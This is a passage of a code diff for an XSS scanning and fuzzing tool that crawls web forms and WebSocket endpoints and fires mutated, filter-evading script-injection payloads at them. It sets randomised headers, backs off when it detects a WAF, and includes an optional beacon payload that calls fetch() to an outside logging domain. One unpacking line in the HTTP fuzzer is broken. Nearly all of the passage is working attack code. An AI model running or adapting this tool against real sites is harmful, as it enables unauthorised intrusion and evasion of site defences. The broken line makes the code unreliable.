+                    if k: store.append({"url":u,"method":"WS","params":k,"json":True,"template":d})
+            def dom_scrape():
+                r=page.evaluate("""(()=>{return[...document.forms].map(f=>({a:f.action||location.href,m:(f.method||'get').toUpperCase(),p:[...f.querySelectorAll('input[name]')].map(i=>i.name)}))})()""")
+                for f in r:
+                    if urllib.parse.urlparse(f["a"]).netloc.lower()!=host or not f["p"]: continue
+                    found.append({"url":f["a"],"method":f["m"],"params":f["p"]})
+            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
+            st=time.time()*1000; rd=0
+            while (time.time()*1000-st)<DYN_OBS_MS and rd<MAX_DYN_ROUNDS:
+                try: page.wait_for_event("nav",timeout=RESCAN_MS)
+                except: pass
+                dom_scrape(); rd+=1
+            ctx.close(); br.close()
+    except Exception as e: dbg(f"[dyn] {e}")
+    return found
 
-    templates = random.sample(TEMPLATES, k=min(len(TEMPLATES), 15))
+# ─── WEBSOCKET FUZZER ──────────────────────────────────────────────────────
+def fuzz_ws(t):
+    if not websocket: return
+    url,params,template=t["url"],t["params"],t.get("template") or {}
+    mk=randstr(); body=json.loads(json.dumps(template)) if template else {}
+    (set_deep(body,random.choice(params),f"<img src onerror=alert('{mk}')>") if body
+     else body.update({random.choice(params):f"<svg/onload=alert('{mk}')>"}))
+    pay=json.dumps(body); hit=False
+    def on_msg(_,m): nonlocal hit; hit|=(mk in m)
+    try:
+        ws=websocket.WebSocketApp(url,on_message=on_msg)
+        th=threading.Thread(target=ws.run_forever,kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
+        th.daemon=True; th.start(); time.sleep(1); ws.send(pay); time.sleep(3); ws.close()
+        if hit: log_hit(url,"WS",pay)
+    except Exception as e: dbg(f"[ws] {e}")
 
-    for skel in templates:
-        base = ai_mutate(skel)
-        variants = {
-            base,
-            polymorph(base),
-            legit_wrap(base)
-        }
-
-        for fw in random.sample(FILTER_WRAPPERS, k=2):
-            variants.add(fw.replace("PAYLOAD", base))
-
-        if DNSLOG_DOMAIN:
-            beacon = f"<img src=x onerror=\"fetch('http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{urllib.parse.quote(base)}'))\">"
-            variants.add(beacon)
-
-        for payload in variants:
-            data = {p: payload for p in params}
+# ─── HTTP FUZZER ───────────────────────────────────────────────────────────
+def fuzz_http(t):
+    url,method,params=t["url"],t["method"]; is_json=t.get("json",False);tpl=t.get("template")
+    mk=randstr()
+    try:
+        if is_json and tpl:
+            body=json.loads(json.dumps(tpl)); set_deep(body,random.choice(params),mk)
+            rst=requests.post(url,headers={"Content-Type":"application/json"},data=json.dumps(body),
+                              timeout=HTTP_TIMEOUT,verify=False)
+        else:
+            data={p:mk for p in params}
+            rst=(requests.get if method=="GET" else requests.post)(url,params=data if method=="GET" else None,
+                   data=data if method=="POST" else None,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
+        if rst.status_code!=200 or not reflected(mk,rst.text): return
+    except Exception as e: dbg(f"[probe] {e}"); return
+    for sk in random.sample(PAY,k=min(len(PAY),24)):
+        base=ai_mutate(sk); vars={base,polymorph(base),legit_wrap(base)}
+        for fw in random.sample(FILTER,k=2): vars.add(fw.replace("PAYLOAD",base))
+        if DNSLOG_DOMAIN: vars.add(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('{urllib.parse.quote(base)}'))>")
+        for pay in vars:
             try:
-                r = (requests.get if method == "GET" else requests.post)(
-                    url,
-                    params=data if method == "GET" else None,
-                    data=data if method == "POST" else None,
-                    headers=random_headers(),
-                    timeout=TIMEOUT_REQ,
-                    verify=False
-                )
+                if is_json and tpl:
+                    body=json.loads(json.dumps(tpl))
+                    for p in params: set_deep(body,p,pay)
+                    r=requests.post(url,headers={"Content-Type":"application/json"},
+                                    data=json.dumps(body),timeout=HTTP_TIMEOUT,verify=False)
+                else:
+                    dat={p:pay for p in params}
+                    r=(requests.get if method=="GET" else requests.post)(url,
+                         params=dat if method=="GET" else None,data=dat if method=="POST" else None,
+                         headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
+                if r.status_code in {403,429,503} or any(w in r.text.lower() for w in ("captcha","access denied","blocked")):
+                    dbg(f"[WAF] {url}"); jitter(25,55); return
+                if reflected(pay,r.text) or verify(url,method,dat if not is_json else body,is_json):
+                    log_hit(url,method,pay); return
+            except Exception as e: dbg(f"[err] {e}")
+            jitter(1.0,2.4)
 
-                if r.status_code in {403, 429, 503} or "captcha" in r.text.lower() or "access denied" in r.text.lower():
-                    dbg(f"[BLOCKED] Possible WAF/block ({r.status_code}) at {url}")
-                    time.sleep(random.uniform(30, 60))
-                    return  # stop immediately to avoid further blocking
-
-                if r.status_code != 200:
-                    dbg(f"[skip] payload non-200 ({r.status_code}) → {url}")
-                    continue
-
-                dom_match = reflected(payload, r.text)
-                verified = verify_in_browser(url, method, data)
-
-                if DEBUG:
-                    dbg(f"[test] {url} {method} verified={verified} dom_match={dom_match}")
-
-                if verified or dom_match:
-                    log_finding(url, method, payload)
-                    return
-
-            except Exception as e:
-                dbg(f"[error] {e}")
-
-            time.sleep(random.uniform(1.5, 3.5))  # realistic delay to avoid WAFs
-
-
-
-# ─── AUTOTEST HOSTS ─────────────────────────────────────────────────────────
-AUTOTEST_HOSTS = [
-    "xss-game.appspot.com",
-    "testphp.vulnweb.com"
-]
-
-def expand_autotest() -> List[str]:
-    return [smart_url(h) for h in AUTOTEST_HOSTS]
-
-# ─── MAIN ───────────────────────────────────────────────────────────────────
+# ─── MAIN ─────────────────────────────────────────────────────────────────
+AUTOTEST=["xss-game.appspot.com","testphp.vulnweb.com","portswigger.net/web-security/xss"]
 def main():
-    targets = []
-    if ARGS.autotest:
-        targets = expand_autotest()
-    elif ARGS.url:
-        targets = [ARGS.url]
-    else:
-        parser.print_help()
-        sys.exit(1)
+    roots=[smart_url(h) for h in AUTOTEST] if args.autotest else [args.url] if args.url else []
+    if not roots: ap.print_help(); sys.exit(1)
+    logging.info(f"\n┌─ RazKash AI XSS v{VER}")
+    for r in roots:
+        root=smart_url(r.rstrip("/")); logging.info(f"├─▶ {root}")
+        st=crawl_static(root,args.max_pages); dy=crawl_dynamic(root); targets=st+dy
+        logging.info(f"│   {len(targets)} endpoints")
+        ws=[t for t in targets if t["method"]=="WS"]; htt=[t for t in targets if t["method"]!="WS"]
+        with ThreadPoolExecutor(max_workers=args.threads) as pool:
+            pool.map(fuzz_http,htt); pool.map(fuzz_ws,ws)
+        logging.info("│   ✓ done\n")
+    logging.info(f"└─ Results → {LOGFILE.resolve()}\n")
 
-    logging.info(f"\n AI XSS v{VERSION}\n")
-    for t in targets:
-        root = smart_url(t.rstrip("/"))
-        logging.info(f"[»] Scanning: {root}")
-        forms = crawl(root, ARGS.max_pages)
-        logging.info(f"[+] Found {len(forms)} forms/endpoints")
-        with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
-            pool.map(fuzz_target, forms)
-        logging.info("[✓] Scan complete\n")
-
-    logging.info(f"📄 Results → {LOGFILE.resolve()}")
-
-if __name__ == "__main__":
-    main()
+if __name__=="__main__": main()
